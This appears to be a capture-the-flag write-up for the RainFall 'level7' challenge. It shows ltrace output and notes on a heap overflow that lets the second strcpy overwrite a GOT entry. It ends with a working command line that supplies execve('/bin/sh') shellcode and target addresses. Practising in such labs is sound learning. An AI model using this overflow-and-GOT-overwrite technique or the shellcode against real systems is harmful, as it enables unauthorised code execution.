Segfault with less than 2 args.
interesting  ltrace output:
```
level7@RainFall:~$ ltrace ./level7 a b       
__libc_start_main(0x8048521, 3, 0xbffffd04, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                             = 0x0804a008
malloc(8)                                                                             = 0x0804a018
malloc(8)                                                                             = 0x0804a028
malloc(8)                                                                             = 0x0804a038
strcpy(0x0804a018, "a")                                                               = 0x0804a018
strcpy(0x0804a038, "b")                                                               = 0x0804a038
fopen("/home/user/level8/.pass", "r")                                                 = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

We see that fgets store it's result to a place used only by m(),
so likely we need to change the call to puts() to a call to m()...

Overflowing the first buffer lets us decide where the string of the second one will be copied, we can check that with ltrace easily :
```
 ltrace ./level7 $(python -c 'print "A"*20+"\x60\x99\x04\x08"') BBBB
```
So we just need to replace the values from the GOT

```
./level7 $(python -c 'print "\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"AAA"+"\x1c\xfc\xff\xbf"') $(python -c 'print "\x18\xa0\x04\x08"')
```
